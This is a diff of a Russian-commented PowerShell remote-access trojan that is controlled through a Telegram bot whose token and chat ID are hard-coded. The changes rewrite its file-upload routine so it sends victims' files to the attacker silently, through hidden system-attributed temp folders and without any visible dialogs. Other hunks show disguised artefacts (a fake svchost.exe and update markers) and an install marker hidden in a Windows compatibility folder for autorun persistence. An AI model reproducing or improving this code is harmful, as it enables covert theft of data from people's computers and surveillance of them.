@@ -1,4 +1,4 @@
-# RAT через Telegram Bot - УЛУЧШЕННАЯ МАСКИРОВКА
+# RAT через Telegram Bot - ИСПРАВЛЕННАЯ ВЕРСИЯ БЕЗ ДИАЛОГОВ
 $Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
 $ChatID = "5674514050"
 
@@ -70,54 +70,67 @@ function Send-Telegram {
     }
 }
 
-# Функция отправки файлов
+# Функция отправки файлов - ПОЛНОСТЬЮ ПЕРЕПИСАНА
 function Send-TelegramFile {
     param([string]$FilePath)
     
     $url = "https://api.telegram.org/bot$Token/sendDocument"
     
     try {
-        # Создаем временную копию файла с уникальным именем
-        $tempDir = "$env:TEMP\TelegramUpload"
-        if (!(Test-Path $tempDir)) {
-            New-Item -Path $tempDir -ItemType Directory -Force | Out-Null
-            attrib +s +h "$tempDir" 2>&1 | Out-Null
-        }
+        # Используем WebClient для избежания диалогов
+        $webClient = New-Object System.Net.WebClient
+        
+        # Создаем временный файл с уникальным именем
+        $tempDir = "$env:TEMP\TelegramUpload_$(Get-Random)"
+        New-Item -Path $tempDir -ItemType Directory -Force | Out-Null
+        attrib +s +h "$tempDir" 2>&1 | Out-Null
         
         $originalName = Split-Path $FilePath -Leaf
-        $tempFilePath = Join-Path $tempDir "$([System.IO.Path]::GetRandomFileName())_$originalName"
+        $tempFilePath = Join-Path $tempDir $originalName
         
-        # Копируем файл во временную директорию
+        # Копируем файл с принудительной перезаписью
         Copy-Item $FilePath $tempFilePath -Force
         
-        $fileBytes = [System.IO.File]::ReadAllBytes($tempFilePath)
-        $fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
+        # Формируем multipart запрос вручную
         $boundary = [System.Guid]::NewGuid().ToString()
-
-        $bodyLines = (
-            "--$boundary",
-            "Content-Disposition: form-data; name=`"chat_id`"",
-            "",
-            $ChatID,
-            "--$boundary",
-            "Content-Disposition: form-data; name=`"document`"; filename=`"$originalName`"",
-            "Content-Type: application/octet-stream",
-            "",
-            $fileEnc,
-            "--$boundary--"
-        ) -join "`r`n"
-
-        $response = Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines -UseBasicParsing
+        $fileBytes = [System.IO.File]::ReadAllBytes($tempFilePath)
+        $encoding = [System.Text.Encoding]::GetEncoding("iso-8859-1")
         
-        # Удаляем временный файл после отправки
+        # Формируем тело запроса
+        $bodyBuilder = New-Object System.Text.StringBuilder
+        
+        # Добавляем chat_id
+        $bodyBuilder.AppendLine("--$boundary") | Out-Null
+        $bodyBuilder.AppendLine('Content-Disposition: form-data; name="chat_id"') | Out-Null
+        $bodyBuilder.AppendLine() | Out-Null
+        $bodyBuilder.AppendLine($ChatID) | Out-Null
+        
+        # Добавляем файл
+        $bodyBuilder.AppendLine("--$boundary") | Out-Null
+        $bodyBuilder.AppendLine("Content-Disposition: form-data; name=`"document`"; filename=`"$originalName`"") | Out-Null
+        $bodyBuilder.AppendLine("Content-Type: application/octet-stream") | Out-Null
+        $bodyBuilder.AppendLine() | Out-Null
+        
+        $bodyBytes = $encoding.GetBytes($bodyBuilder.ToString())
+        
+        # Создаем конечный массив байтов
+        $endLine = $encoding.GetBytes("`r`n--$boundary--`r`n")
+        $finalBytes = $bodyBytes + $fileBytes + $endLine
+        
+        # Отправляем запрос
+        $webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
+        $response = $webClient.UploadData($url, "POST", $finalBytes)
+        
+        # Очищаем временные файлы
         Remove-Item $tempFilePath -Force -ErrorAction SilentlyContinue
+        Remove-Item $tempDir -Force -ErrorAction SilentlyContinue
+        $webClient.Dispose()
+        
         return $true
         
     } catch {
         try {
-            # Резервный метод отправки файла - используем MemoryStream чтобы избежать диалогов
-            Add-Type -AssemblyName System.Web
-            
+            # Резервный метод - используем Invoke-RestMethod с MemoryStream
             $fileContent = [System.IO.File]::ReadAllBytes($FilePath)
             $fileStream = New-Object System.IO.MemoryStream(,$fileContent)
             
@@ -191,7 +204,7 @@ function Invoke-Cleanup {
         "$env:TEMP\rat_installed.marker",
         "$env:WINDIR\System32\System32Logs\svchost.exe",
         "$env:PROGRAMDATA\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Persisted\windows_update.marker",
-        "$env:TEMP\TelegramUpload\*"
+        "$env:TEMP\TelegramUpload_*"
     )
 
     $deletedFiles = @()
@@ -259,7 +272,6 @@ $($regEntries -join "`n")
 }
 
 # Установка в автозагрузку с улучшенной маскировкой
-# НОВОЕ МЕСТО ДЛЯ МАРКЕРА - системная папка AppCompatFlags
 $installMarkerDir = "$env:PROGRAMDATA\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Persisted"
 if (!(Test-Path $installMarkerDir)) {
     New-Item -Path $installMarkerDir -ItemType Directory -Force | Out-Null
